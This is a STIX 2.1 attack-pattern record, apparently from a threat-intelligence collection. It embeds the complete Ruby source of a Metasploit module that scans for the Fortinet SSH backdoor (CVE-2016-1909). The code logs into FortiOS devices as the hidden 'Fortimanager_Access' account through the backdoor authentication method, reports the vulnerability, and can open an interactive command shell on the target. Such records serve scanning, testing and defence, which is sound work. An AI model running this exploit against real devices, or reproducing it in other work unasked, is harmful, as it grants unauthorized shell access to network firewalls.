{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3f61b88-3db0-4077-99d0-8400ac4030bd",
    "created": "2024-08-14T16:27:26.562137Z",
    "modified": "2024-08-14T16:27:26.562141Z",
    "name": "Fortinet SSH Backdoor Scanner",
    "description": " This module scans for the Fortinet SSH backdoor. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/fortinet_backdoor.rb",
            "external_id": "fortinet_backdoor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1909"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Jan/26"
        },
        {
            "source_name": "reference",
            "url": "https://blog.fortinet.com/post/brief-statement-regarding-issues-found-with-fortios"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::SSH\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::CommandShell\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Fortinet SSH Backdoor Scanner',\n      'Description'    => %q{\n        This module scans for the Fortinet SSH backdoor.\n      },\n      'Author'         => [\n        'operator8203 <operator8203[at]runbox.com>', # PoC\n        'wvu'                                        # Module\n      ],\n      'References'     => [\n        ['CVE', '2016-1909'],\n        ['EDB', '39224'],\n        ['PACKETSTORM', '135225'],\n        ['URL', 'https://seclists.org/fulldisclosure/2016/Jan/26'],\n        ['URL', 'https://blog.fortinet.com/post/brief-statement-regarding-issues-found-with-fortios']\n      ],\n      'DisclosureDate' => '2016-01-09',\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options([\n      Opt::RPORT(22)\n    ])\n\n    register_advanced_options([\n      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),\n      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])\n    ])\n  end\n\n  def run_host(ip)\n    factory = ssh_socket_factory\n\n    ssh_opts = ssh_client_defaults.merge({\n      port:            rport,\n      # The auth method is converted into a class name for instantiation,\n      # so fortinet-backdoor here becomes FortinetBackdoor from the mixin\n      auth_methods:    ['fortinet-backdoor']\n    })\n\n    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(ip, 'Fortimanager_Access', ssh_opts)\n      end\n    rescue Net::SSH::Exception => e\n      vprint_error(\"#{ip}:#{rport} - #{e.class}: #{e.message}\")\n      return\n    end\n\n    return unless ssh\n\n    print_good(\"#{ip}:#{rport} - Logged in as Fortimanager_Access\")\n\n    version = ssh.transport.server_version.version\n\n    report_vuln(\n      host: ip,\n      name: self.name,\n      refs: self.references,\n      info: version\n    )\n\n    shell = Net::SSH::CommandStream.new(ssh)\n\n    # XXX: Wait for CommandStream to log a channel request failure\n    sleep 0.1\n\n    if (e = shell.error)\n      print_error(\"#{ip}:#{rport} - #{e.class}: #{e.message}\")\n      return\n    end\n\n    info = \"#{self.name} (#{version})\"\n\n    ds_merge = {\n      'USERNAME' => 'Fortimanager_Access'\n    }\n\n    if datastore['CreateSession']\n      start_session(self, info, ds_merge, false, shell.lsock)\n    end\n\n    # XXX: Ruby segfaults if we don't remove the SSH socket\n    remove_socket(ssh.transport.socket)\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2016-01-09"
}